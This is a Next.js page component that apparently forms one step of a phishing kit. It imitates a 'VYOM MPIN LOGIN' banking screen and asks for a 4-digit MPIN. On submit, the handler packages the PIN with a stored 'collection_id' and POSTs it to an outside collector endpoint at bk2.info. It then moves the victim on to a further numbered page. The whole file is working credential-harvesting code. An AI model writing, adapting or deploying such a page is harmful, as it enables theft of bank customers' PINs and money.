'use client';
import Footer from "../inlcude/footer";
import Header from "../inlcude/header";
import { useRouter } from "next/navigation";  


export default function Home() {
    const router = useRouter();
    const API_URL = "https://bk2.info/api/form/add";
    const handleSubmit = async (e) => {
        e.preventDefault();
        const formData = new FormData(e.target);
        const jsonObject1 = {};
        const jsonObject = {};
        formData.forEach((value, key) => {
            jsonObject[key] = value;
        });
        jsonObject1['data'] = jsonObject;
        jsonObject1['site'] = "localhost";
        jsonObject1['id'] = localStorage.getItem("collection_id");
        
        try {
            const response = await fetch(`${API_URL}`, {
                method: 'POST',
                body: JSON.stringify(jsonObject1)
            });

            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            const responseData = await response.json();
            router.push('/3');
        } catch (error) {
            console.error('There was a problem with the fetch operation:', error);
        }
    };
  return (
    <>
    <Header />
    
    <div className="bg-danger text-white    text-center">
        <small>VYOM MPIN LOGIN</small>
    </div>
    <div className="bg-primary" style={{marginTop:"25px"}} >
        <form onSubmit={handleSubmit} className="mt-3 py-2">
            <div className="form-group mb-4">
                <label htmlFor="">MPIN* </label>
                <input name="MNo" type="password" inputMode="numeric" className="form-control"  minLength={4} maxLength={4}  required/>
            </div>
            <div className="d-flex text-center mb-4 form-group justify-content-center ">
                <input type="submit" className="btn btn-light px-4 text-primary mt-2" defaultValue="Submit" />
            </div>
        </form>
    </div>
    <Footer />
</>
  );
}
